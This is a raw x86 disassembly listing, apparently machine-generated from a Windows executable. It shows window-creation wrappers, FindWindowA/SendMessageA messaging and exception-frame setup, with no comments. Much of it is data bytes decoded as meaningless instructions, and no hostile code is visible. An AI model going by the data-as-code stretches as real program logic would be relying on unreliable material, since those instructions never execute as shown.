mov dl 0x46
add [ ebx - 0x6bda0040 ] cl
mov dl 0x46
add [ ebx - 0x6fda0040 ] cl
mov dl 0x46
add [ ebx - 0x73da0040 ] cl
mov dl 0x46
add [ ebx - 0x77da0040 ] cl
mov dl 0x46
add [ ebx - 0x7bda0040 ] cl
mov dl 0x46
add [ ebx - 0x7fda0040 ] cl
mov dl 0x46
add [ ebx + 0x7c25ffc0 ] cl
mov dl 0x46
add [ ebx + 0x7825ffc0 ] cl
mov dl 0x46
add [ ebx + 0x7425ffc0 ] cl
mov dl 0x46
add [ ebx + 0x7025ffc0 ] cl
mov dl 0x46
add [ ebx + 0x6c25ffc0 ] cl
mov dl 0x46
add [ ebx + 0x6825ffc0 ] cl
mov dl 0x46
add [ ebx + 0x6425ffc0 ] cl
mov dl 0x46
add [ ebx + 0x6025ffc0 ] cl
mov dl 0x46
add [ ebx + 0x5c25ffc0 ] cl
mov dl 0x46
add [ ebx + 0x5825ffc0 ] cl
mov dl 0x46
add [ ebx + 0x5425ffc0 ] cl
mov dl 0x46
add [ ebx + 0x5025ffc0 ] cl
mov dl 0x46
add [ ebx + 0x4c25ffc0 ] cl
mov dl 0x46
add [ ebx + 0x4825ffc0 ] cl
mov dl 0x46
add [ ebx + 0x4425ffc0 ] cl
mov dl 0x46
add [ ebx + 0x4025ffc0 ] cl
mov dl 0x46
add [ ebx + 0x3c25ffc0 ] cl
mov dl 0x46
add [ ebx + 0x3825ffc0 ] cl
mov dl 0x46
add [ ebx + 0x3425ffc0 ] cl
mov dl 0x46
add [ ebx + 0x3025ffc0 ] cl
mov dl 0x46
add [ ebx + 0x2c25ffc0 ] cl
mov dl 0x46
add [ ebx + 0x2825ffc0 ] cl
mov dl 0x46
add [ ebx + 0x2425ffc0 ] cl
mov dl 0x46
add [ ebx + 0x2025ffc0 ] cl
mov dl 0x46
add [ ebx + 0x1c25ffc0 ] cl
mov dl 0x46
add [ ebx + 0x1825ffc0 ] cl
mov dl 0x46
add [ ebx + 0x1425ffc0 ] cl
mov dl 0x46
add [ ebx + 0x1025ffc0 ] cl
mov dl 0x46
add [ ebx + 0xc25ffc0 ] cl
mov dl 0x46
add [ ebx + 0x825ffc0 ] cl
mov dl 0x46
add [ ebx + 0x425ffc0 ] cl
mov dl 0x46
add [ ebx + 0x2025ffc0 ] cl
mov bl 0x46
add [ ebx + 0x1c25ffc0 ] cl
mov bl 0x46
add [ ebx + 0x1825ffc0 ] cl
mov bl 0x46
add [ ebx + 0x425ffc0 ] cl
mov ah 0x46
add [ ebx + 0x25ffc0 ] cl
mov ah 0x46
add [ ebx - 0x3da0040 ] cl
mov bl 0x46
add [ ebx - 0x7da0040 ] cl
mov bl 0x46
add [ ebx - 0xbda0040 ] cl
mov bl 0x46
add [ ebx - 0xfda0040 ] cl
mov bl 0x46
add [ ebx - 0x13da0040 ] cl
mov bl 0x46
add [ ebx - 0x17da0040 ] cl
mov bl 0x46
add [ ebx - 0x1bda0040 ] cl
mov bl 0x46
add [ ebx - 0x1fda0040 ] cl
mov bl 0x46
add [ ebx - 0x23da0040 ] cl
mov bl 0x46
add [ ebx - 0x27da0040 ] cl
mov bl 0x46
add [ ebx - 0x2bda0040 ] cl
mov bl 0x46
add [ ebx - 0x2fda0040 ] cl
mov bl 0x46
add [ ebx - 0x33da0040 ] cl
mov bl 0x46
add [ ebx - 0x37da0040 ] cl
mov bl 0x46
add [ ebx - 0x3bda0040 ] cl
mov bl 0x46
add [ ebx - 0x3fda0040 ] cl
mov bl 0x46
add [ ebx - 0x43da0040 ] cl
mov bl 0x46
add [ ebx - 0x47da0040 ] cl
mov bl 0x46
add [ ebx - 0x4bda0040 ] cl
mov bl 0x46
add [ ebx - 0x4fda0040 ] cl
mov bl 0x46
add [ ebx - 0x53da0040 ] cl
mov bl 0x46
add [ ebx - 0x57da0040 ] cl
mov bl 0x46
add [ ebx - 0x5bda0040 ] cl
mov bl 0x46
add [ ebx - 0x5fda0040 ] cl
mov bl 0x46
add [ ebx - 0x63da0040 ] cl
mov bl 0x46
add [ ebx - 0x67da0040 ] cl
mov bl 0x46
add [ ebx - 0x6bda0040 ] cl
mov bl 0x46
add [ ebx - 0x6fda0040 ] cl
mov bl 0x46
add [ ebx - 0x73da0040 ] cl
mov bl 0x46
add [ ebx - 0x77da0040 ] cl
mov bl 0x46
add [ ebx - 0x7bda0040 ] cl
mov bl 0x46
add [ ebx - 0x7fda0040 ] cl
mov bl 0x46
add [ ebx + 0x7c25ffc0 ] cl
mov bl 0x46
add [ ebx + 0x7825ffc0 ] cl
mov bl 0x46
add [ ebx + 0x7425ffc0 ] cl
mov bl 0x46
add [ ebx + 0x7025ffc0 ] cl
mov bl 0x46
add [ ebx + 0x6c25ffc0 ] cl
mov bl 0x46
add [ ebx + 0x6825ffc0 ] cl
mov bl 0x46
add [ ebx + 0x6425ffc0 ] cl
mov bl 0x46
add [ ebx + 0x6025ffc0 ] cl
mov bl 0x46
add [ ebx + 0x5c25ffc0 ] cl
mov bl 0x46
add [ ebx + 0x5825ffc0 ] cl
mov bl 0x46
add [ ebx + 0x5425ffc0 ] cl
mov bl 0x46
add [ ebx + 0x5025ffc0 ] cl
mov bl 0x46
add [ ebx + 0x4c25ffc0 ] cl
mov bl 0x46
add [ ebx + 0x4825ffc0 ] cl
mov bl 0x46
add [ ebx + 0x4425ffc0 ] cl
mov bl 0x46
add [ ebx + 0x4025ffc0 ] cl
mov bl 0x46
add [ ebx + 0x3c25ffc0 ] cl
mov bl 0x46
add [ ebx + 0x3825ffc0 ] cl
mov bl 0x46
add [ ebx + 0x3425ffc0 ] cl
mov bl 0x46
add [ ebx + 0x3025ffc0 ] cl
mov bl 0x46
add [ ebx + 0x2c25ffc0 ] cl
mov bl 0x46
add [ ebx + 0x2825ffc0 ] cl
mov bl 0x46
add [ ebx - 0x7bda0040 ] cl
mov dh 0x46
add [ ebx - 0x7fda0040 ] cl
mov dh 0x46
add [ ebx + 0x7825ffc0 ] cl
mov dh 0x46
add [ ebx + 0x7025ffc0 ] cl
mov dh 0x46
add [ ebx + 0x6c25ffc0 ] cl
mov dh 0x46
add [ ebx + 0x6825ffc0 ] cl
mov dh 0x46
add [ ebx + 0x6425ffc0 ] cl
mov dh 0x46
add [ ebx + 0x7425ffc0 ] cl
mov dh 0x46
add [ ebx + 0x7c25ffc0 ] cl
mov dh 0x46
add [ ebx + 0x6025ffc0 ] cl
mov dh 0x46
add [ ebx + 0x5c25ffc0 ] cl
mov dh 0x46
add [ ebx + 0x5825ffc0 ] cl
mov dh 0x46
add [ ebx + 0x5425ffc0 ] cl
mov dh 0x46
add [ ebx + 0x5025ffc0 ] cl
mov dh 0x46
add [ ebx + 0x4c25ffc0 ] cl
mov dh 0x46
add [ ebx + 0x4825ffc0 ] cl
mov dh 0x46
add [ ebx + 0x4425ffc0 ] cl
mov dh 0x46
add [ ebx + 0x4025ffc0 ] cl
mov dh 0x46
add [ ebx + 0x3c25ffc0 ] cl
mov dh 0x46
add [ ebx + 0x3825ffc0 ] cl
mov dh 0x46
add [ ebx + 0x3425ffc0 ] cl
mov dh 0x46
add [ ebx + 0x3025ffc0 ] cl
mov dh 0x46
add [ ebx + 0x2c25ffc0 ] cl
mov dh 0x46
add [ ebx + 0x2825ffc0 ] cl
mov dh 0x46
add [ ebx + 0x2425ffc0 ] cl
mov dh 0x46
add [ ebx + 0x2025ffc0 ] cl
mov dh 0x46
add [ ebx + 0x1c25ffc0 ] cl
mov dh 0x46
add [ ebx + 0x1825ffc0 ] cl
mov dh 0x46
add [ ebx + 0x1425ffc0 ] cl
mov dh 0x46
add [ ebx + 0x1025ffc0 ] cl
mov dh 0x46
add [ ebx + 0xc25ffc0 ] cl
mov dh 0x46
add [ ebx + 0x825ffc0 ] cl
mov dh 0x46
add [ ebx + 0x425ffc0 ] cl
mov dh 0x46
add [ ebx + 0x25ffc0 ] cl
mov dh 0x46
add [ ebx - 0x3da0040 ] cl
mov ch 0x46
add [ ebx - 0x7da0040 ] cl
mov ch 0x46
add [ ebx - 0xbda0040 ] cl
mov ch 0x46
add [ ebx - 0xfda0040 ] cl
mov ch 0x46
add [ ebx - 0x13da0040 ] cl
mov ch 0x46
add [ ebx - 0x17da0040 ] cl
mov ch 0x46
add [ ebx - 0x1bda0040 ] cl
mov ch 0x46
add [ ebx - 0x1fda0040 ] cl
mov ch 0x46
add [ ebx - 0x23da0040 ] cl
mov ch 0x46
add [ ebx - 0x27da0040 ] cl
mov ch 0x46
add [ ebx - 0x2bda0040 ] cl
mov ch 0x46
add [ ebx - 0x2fda0040 ] cl
mov ch 0x46
add [ ebx - 0x33da0040 ] cl
mov ch 0x46
add [ ebx - 0x37da0040 ] cl
mov ch 0x46
add [ ebx - 0x3bda0040 ] cl
mov ch 0x46
add [ ebx - 0x3fda0040 ] cl
mov ch 0x46
add [ ebx - 0x43da0040 ] cl
mov ch 0x46
add [ ebx - 0x47da0040 ] cl
mov ch 0x46
add [ ebx - 0x4bda0040 ] cl
mov ch 0x46
add [ ebx - 0x4fda0040 ] cl
mov ch 0x46
add [ ebx - 0x53da0040 ] cl
mov ch 0x46
add [ ebx - 0x57da0040 ] cl
mov ch 0x46
add [ ebx - 0x5bda0040 ] cl
mov ch 0x46
add [ ebx - 0x5fda0040 ] cl
mov ch 0x46
add [ ebx - 0x63da0040 ] cl
mov ch 0x46
add [ ebx - 0x67da0040 ] cl
mov ch 0x46
add [ ebx - 0x6bda0040 ] cl
mov ch 0x46
add [ ebx - 0x6fda0040 ] cl
mov ch 0x46
add [ ebx - 0x73da0040 ] cl
mov ch 0x46
add [ ebx - 0x77da0040 ] cl
mov ch 0x46
add [ ebx - 0x7bda0040 ] cl
mov ch 0x46
add [ ebx - 0x7fda0040 ] cl
mov ch 0x46
add [ ebx + 0x7c25ffc0 ] cl
mov ch 0x46
add [ ebx + 0x7825ffc0 ] cl
mov ch 0x46
add [ ebx + 0x7425ffc0 ] cl
mov ch 0x46
add [ ebx + 0x7025ffc0 ] cl
mov ch 0x46
add [ ebx + 0x6c25ffc0 ] cl
mov ch 0x46
add [ ebx + 0x6825ffc0 ] cl
mov ch 0x46
add [ ebx + 0x6425ffc0 ] cl
mov ch 0x46
add [ ebx + 0x6025ffc0 ] cl
mov ch 0x46
add [ ebx + 0x5c25ffc0 ] cl
mov ch 0x46
add [ ebx + 0x5825ffc0 ] cl
mov ch 0x46
add [ ebx + 0x5425ffc0 ] cl
mov ch 0x46
add [ ebx + 0x5025ffc0 ] cl
mov ch 0x46
add [ ebx + 0x7c25ffc0 ] cl
mov ch 0x46
add [ ebx + 0x4c25ffc0 ] cl
mov ch 0x46
add [ ebx + 0x4825ffc0 ] cl
mov ch 0x46
add [ ebx + 0x4425ffc0 ] cl
mov ch 0x46
add [ ebx + 0x4025ffc0 ] cl
mov ch 0x46
add [ ebx + 0x3c25ffc0 ] cl
mov ch 0x46
add [ ebx + 0x3825ffc0 ] cl
mov ch 0x46
add [ ebx + 0x3825ffc0 ] cl
mov ch 0x46
add [ ebx + 0x3425ffc0 ] cl
mov ch 0x46
add [ ebx + 0x3025ffc0 ] cl
mov ch 0x46
add [ ebx + 0x2c25ffc0 ] cl
mov ch 0x46
add [ ebx + 0x2825ffc0 ] cl
mov ch 0x46
add [ ebx + 0x2425ffc0 ] cl
mov ch 0x46
add [ ebx + 0x2025ffc0 ] cl
mov ch 0x46
add [ ebx + 0x1c25ffc0 ] cl
mov ch 0x46
add [ ebx + 0x1825ffc0 ] cl
mov ch 0x46
add [ ebx + 0x1425ffc0 ] cl
mov ch 0x46
add [ ebx + 0x1025ffc0 ] cl
mov ch 0x46
add [ ebx + 0xc25ffc0 ] cl
mov ch 0x46
add [ ebx + 0x825ffc0 ] cl
mov ch 0x46
add [ ebx + 0x425ffc0 ] cl
mov ch 0x46
add [ ebx + 0x25ffc0 ] cl
mov ch 0x46
add [ ebx - 0x3da0040 ] cl
mov ah 0x46
add [ ebx - 0x7da0040 ] cl
mov ah 0x46
add [ ebx - 0xbda0040 ] cl
mov ah 0x46
add [ ebx - 0xfda0040 ] cl
mov ah 0x46
add [ ebx - 0x13da0040 ] cl
mov ah 0x46
add [ ebx - 0x17da0040 ] cl
mov ah 0x46
add [ ebx - 0x1bda0040 ] cl
mov ah 0x46
add [ ebx - 0x1fda0040 ] cl
mov ah 0x46
add [ ebx - 0x23da0040 ] cl
mov ah 0x46
add [ ebx - 0x27da0040 ] cl
mov ah 0x46
add [ ebx - 0x2bda0040 ] cl
mov ah 0x46
add [ ebx - 0x2fda0040 ] cl
mov ah 0x46
add [ ebx - 0x33da0040 ] cl
mov ah 0x46
add [ ebx - 0x37da0040 ] cl
mov ah 0x46
add [ ebx - 0x3bda0040 ] cl
mov ah 0x46
add [ ebx - 0x3fda0040 ] cl
mov ah 0x46
add [ ebx - 0x43da0040 ] cl
mov ah 0x46
add [ ebx - 0x47da0040 ] cl
mov ah 0x46
add [ ebx - 0x4bda0040 ] cl
mov ah 0x46
add [ ebx - 0x4fda0040 ] cl
mov ah 0x46
add [ ebx - 0x53da0040 ] cl
mov ah 0x46
add [ ebx - 0x57da0040 ] cl
mov ah 0x46
add [ ebx - 0x5bda0040 ] cl
mov ah 0x46
add [ ebx - 0x5fda0040 ] cl
mov ah 0x46
add [ ebx - 0x63da0040 ] cl
mov ah 0x46
add [ ebx - 0x67da0040 ] cl
mov ah 0x46
add [ ebx - 0x6bda0040 ] cl
mov ah 0x46
add [ ebx - 0x6fda0040 ] cl
mov ah 0x46
add [ ebx - 0x73da0040 ] cl
mov ah 0x46
add [ ebx - 0x77da0040 ] cl
mov ah 0x46
add [ ebx - 0x7bda0040 ] cl
mov ah 0x46
add [ ebx - 0x7fda0040 ] cl
mov ah 0x46
add [ ebx + 0x7c25ffc0 ] cl
mov ah 0x46
add [ ebx + 0x7825ffc0 ] cl
mov ah 0x46
add [ ebx + 0x7425ffc0 ] cl
mov ah 0x46
add [ ebx + 0x7025ffc0 ] cl
mov ah 0x46
add [ ebx + 0x6c25ffc0 ] cl
mov ah 0x46
add [ ebx + 0x6825ffc0 ] cl
mov ah 0x46
add [ ebx + 0x6425ffc0 ] cl
mov ah 0x46
add [ ebx + 0x6025ffc0 ] cl
mov ah 0x46
add [ ebx + 0x5c25ffc0 ] cl
mov ah 0x46
add [ ebx + 0x5825ffc0 ] cl
mov ah 0x46
add [ ebx + 0x5425ffc0 ] cl
mov ah 0x46
add [ ebx + 0x5025ffc0 ] cl
mov ah 0x46
add [ ebx + 0x4c25ffc0 ] cl
mov ah 0x46
add [ ebx + 0x4825ffc0 ] cl
mov ah 0x46
add [ ebx + 0x4425ffc0 ] cl
mov ah 0x46
add [ ebx + 0x4025ffc0 ] cl
mov ah 0x46
add [ ebx + 0x3c25ffc0 ] cl
mov ah 0x46
add [ ebx + 0x3825ffc0 ] cl
mov ah 0x46
add [ ebx + 0x3425ffc0 ] cl
mov ah 0x46
add [ ebx + 0x3025ffc0 ] cl
mov ah 0x46
add [ ebx + 0x2c25ffc0 ] cl
mov ah 0x46
add [ ebx + 0x2825ffc0 ] cl
mov ah 0x46
add [ ebx + 0x2425ffc0 ] cl
mov ah 0x46
add [ ebx + 0x2025ffc0 ] cl
mov ah 0x46
add [ ebx + 0x1c25ffc0 ] cl
mov ah 0x46
add [ ebx + 0x1825ffc0 ] cl
mov ah 0x46
add [ ebx + 0x1425ffc0 ] cl
mov ah 0x46
add [ ebx + 0x1025ffc0 ] cl
mov ah 0x46
add [ ebx - 0x3f48f040 ] cl
movzx edx dx
shl edx 0x10
or eax edx
retn
inc esi
ja EnterCriticalSection
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx + 0x425ffc0 ] cl
add [ ebx + 0xc25ffc0 ] cl
mov bl 0x46
add [ ebx + 0x825ffc0 ] cl
mov bl 0x46
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je FindResourceA
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
adc al 0x5e
inc eax
add [ esi ] al
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
je r-xdata
add [ ebx + 0x25ffc0 ] cl
mov bl 0x46
add [ ebx - 0x3da0040 ] cl
mov eax eax
add esp [ eax + 0x5d ]
inc eax
add [ ebx - 0x3da0040 ] cl
mov cl 0x46
add [ ebx - 0x7da0040 ] cl
mov cl 0x46
add [ ebx - 0xbda0040 ] cl
mov cl 0x46
add [ ebx + 0x1025ffc0 ] cl
mov bl 0x46
sub_4067dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402918
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402908
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406834
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402918
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402908
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_40688c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406981
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4069a9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4069b0
retn
sub_4069bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4069e1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4069e8
retn
sub_4069f4
cmpsb [ fs : esi ] [ edi ]
inc esi
add al dh
inc [ eax ]
add [ esi + 0x46 ] ah
add cl dh
inc [ eax ]
add [ esi + 0x46 ] ah
add dl dh
inc [ eax ]
add [ esi + 0x46 ] ah
add bl dh
inc [ eax ]
add [ esi + 0x46 ] ah
add ah dh
inc [ eax ]
add [ esi + 0x46 ] ah
add ch dh
inc [ eax ]
add [ esi + 0x46 ] ah
add dh dh
inc [ eax ]
add [ esi + 0x46 ] ah
add bh dh
inc [ eax ]
add [ esi + 0x46 ] ah
add al bh
inc [ eax ]
add [ esi + 0x46 ] ah
add cl bh
inc [ eax ]
add [ esi + 0x46 ] ah
add dl bh
inc [ eax ]
add [ esi + 0x46 ] ah
add bl bh
inc [ eax ]
add [ esi + 0x46 ] ah
add ah bh
inc [ eax ]
add [ esi + 0x46 ] ah
add ch bh
inc [ eax ]
add [ esi + 0x46 ] ah
add dh bh
inc [ eax ]
add [ esi + 0x46 ] ah
add bh bh
inc [ eax ]
add [ esi + 0x46 ] ah
add al ah
inc [ eax ]
add [ esi + 0x46 ] ah
add cl ah
inc [ eax ]
add [ esi + 0x46 ] ah
add dl ah
inc [ eax ]
add [ esi + 0x46 ] ah
add bl ah
inc [ eax ]
add [ esi + 0x46 ] ah
add ah ah
inc [ eax ]
add [ esi + 0x46 ] ah
add ch ah
inc [ eax ]
add [ esi + 0x46 ] ah
add dh ah
inc [ eax ]
add [ esi + 0x46 ] ah
add bh ah
inc [ eax ]
add [ esi + 0x46 ] ah
add al ch
inc [ eax ]
add [ esi + 0x46 ] ah
add cl ch
inc [ eax ]
add [ esi + 0x46 ] ah
add dl ch
inc [ eax ]
add [ esi + 0x46 ] ah
add bl ch
inc [ eax ]
add [ esi + 0x46 ] ah
add ah ch
inc [ eax ]
add [ esi + 0x46 ] ah
add ch ch
inc [ eax ]
add [ esi + 0x46 ] ah
add dh ch
inc [ eax ]
add [ esi + 0x46 ] ah
add bh ch
inc [ eax ]
add [ esi + 0x46 ] ah
add al dl
inc [ eax ]
add [ esi + 0x46 ] ah
add cl dl
inc [ eax ]
add [ esi + 0x46 ] ah
add dl dl
inc [ eax ]
add [ esi + 0x46 ] ah
add bl dl
inc [ eax ]
add [ esi + 0x46 ] ah
add ah dl
inc [ eax ]
add [ esi + 0x46 ] ah
add ch dl
inc [ eax ]
add [ esi + 0x46 ] ah
add dh dl
inc [ eax ]
add [ esi + 0x46 ] ah
add bh dl
inc [ eax ]
add [ esi + 0x46 ] ah
add al bl
inc [ eax ]
add [ esi + 0x46 ] ah
add cl bl
inc [ eax ]
add [ esi + 0x46 ] ah
add dl bl
inc [ eax ]
add [ esi + 0x46 ] ah
add bl bl
inc [ eax ]
add [ esi + 0x46 ] ah
add ah bl
inc [ eax ]
add [ esi + 0x46 ] ah
add ch bl
inc [ eax ]
add [ esi + 0x46 ] ah
add dh bl
inc [ eax ]
add [ esi + 0x46 ] ah
add bh bl
inc [ eax ]
add [ esi + 0x46 ] ah
add al al
inc [ eax ]
add [ esi + 0x46 ] ah
add cl al
inc [ eax ]
add [ esi + 0x46 ] ah
add dl al
inc [ eax ]
add [ esi + 0x46 ] ah
add bl al
inc [ eax ]
add [ esi + 0x46 ] ah
add ah al
inc [ eax ]
add [ esi + 0x46 ] ah
add ch al
inc [ eax ]
add [ esi + 0x46 ] ah
add dh al
inc [ eax ]
add [ esi + 0x46 ] ah
add bh al
inc [ eax ]
add [ esi + 0x46 ] ah
add al cl
inc [ eax ]
add [ esi + 0x46 ] ah
add cl cl
inc [ eax ]
add [ esi + 0x46 ] ah
add dl cl
inc [ eax ]
add [ esi + 0x46 ] ah
add bl cl
inc [ eax ]
add [ esi + 0x46 ] ah
add ah cl
inc [ eax ]
add [ esi + 0x46 ] ah
add ch cl
inc [ eax ]
add [ esi + 0x46 ] ah
add dh cl
inc [ eax ]
add [ esi + 0x46 ] ah
add bh cl
inc [ eax ]
add [ esi + 0x46 ] ah
add [ eax + 0x640000ff ] dh
cmpsb [ esi ] [ edi ]
inc esi
add [ ecx + 0x640000ff ] dh
cmpsb [ esi ] [ edi ]
inc esi
add [ edx + 0x640000ff ] dh
cmpsb [ esi ] [ edi ]
inc esi
add [ ebx + 0x640000ff ] dh
cmpsb [ esi ] [ edi ]
inc esi
add [ edi + edi * 8 - 0x599c0000 ] dh
inc esi
add [ ebp + 0x640000ff ] dh
cmpsb [ esi ] [ edi ]
inc esi
add [ esi + 0x640000ff ] dh
cmpsb [ esi ] [ edi ]
inc esi
add [ edi + 0x640000ff ] dh
cmpsb [ esi ] [ edi ]
inc esi
add [ eax + 0x640000ff ] bh
cmpsb [ esi ] [ edi ]
inc esi
add [ ecx + 0x640000ff ] bh
cmpsb [ esi ] [ edi ]
inc esi
add [ edx + 0x640000ff ] bh
cmpsb [ esi ] [ edi ]
inc esi
add [ ebx + 0x640000ff ] bh
cmpsb [ esi ] [ edi ]
inc esi
add [ edi + edi * 8 - 0x599c0000 ] bh
inc esi
add [ ebp + 0x640000ff ] bh
cmpsb [ esi ] [ edi ]
inc esi
add [ esi + 0x640000ff ] bh
cmpsb [ esi ] [ edi ]
inc esi
add [ edi + 0x640000ff ] bh
cmpsb [ esi ] [ edi ]
inc esi
add [ eax + 0x640000ff ] ah
cmpsb [ esi ] [ edi ]
inc esi
add [ ecx + 0x640000ff ] ah
cmpsb [ esi ] [ edi ]
inc esi
add [ edx + 0x640000ff ] ah
cmpsb [ esi ] [ edi ]
inc esi
add [ ebx + 0x640000ff ] ah
cmpsb [ esi ] [ edi ]
inc esi
add [ edi + edi * 8 - 0x599c0000 ] ah
inc esi
add [ ebp + 0x640000ff ] ah
cmpsb [ esi ] [ edi ]
inc esi
add [ esi + 0x640000ff ] ah
cmpsb [ esi ] [ edi ]
inc esi
add [ edi + 0x640000ff ] ah
cmpsb [ esi ] [ edi ]
inc esi
add [ eax + 0x640000ff ] ch
cmpsb [ esi ] [ edi ]
inc esi
add [ ecx + 0x640000ff ] ch
cmpsb [ esi ] [ edi ]
inc esi
add [ edx + 0x550000ff ] ch
mov ebp esp
xor eax eax
push ebp
push sub_406cf1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406cf8
retn
sub_407824
add eax 0xf004078
js r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] bl
js r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add ch ah
ja r-xdata
lodsd [ esi ]
push edx
popad
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add ch ch
ja r-xdata
insb
jne r-xdata
add [ eax ] al
add [ eax ] al
add ch dh
ja r-xdata
retn
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
add [ eax ] al
add [ eax ] al
add ch bh
ja r-xdata
xor al 0x81
inc esi
add [ ebx + 0x34158910 ] cl
add [ esi ] 0x95b0158b
inc esi
arpl [ eax + 0x72 ] bp
outsd
add [ eax + edi * 2 + 0x300040 ] ch
add [ eax ] al
xchg esp eax
adc [ eax ] eax
sub [ ebx ] dh
inc eax
add [ eax + 0x55 ] dh
inc eax
add [ ebp + edx * 2 + 0x40 ] bh
add [ ebx + esi ] bh
inc eax
add [ eax ] dh
xor eax [ eax ]
mov [ ebp + 0x40 ] ss
add [ ecx ] al
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
loopne r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x4078243f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
js r-xdata
add [ ebx + 0xa890448 ] cl
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026ec
call ebx
pop ebx
retn
adc [ ecx + 0x46813415 ] cl
add [ ebx + 0x4695b015 ] cl
outsb
imul edi [ edx + 0x65 ] r-xdata
add [ eax + esi - 0x35cbffc0 ] ch
inc eax
add [ esp + edx * 2 ] ah
dec ebp
jne r-xdata
add [ eax + 0x78 ] al
inc eax
add [ eax ] al
add [ eax ] al
sub_4078d4
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_4078f0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_40386c
pop edi
pop esi
pop ebx
retn
sub_407914
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4026cc
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402b04
mov eax esi
pop esi
pop ebx
retn
sub_407934
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026ec
call ebx
pop ebx
retn
sub_407960
push ebx
mov ebx eax
mov eax 0xc
call sub_4026cc
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407934
pop ebx
retn
sub_407998
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404174
mov ebx eax
mov eax edi
mov edx ebx
call sub_404500
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
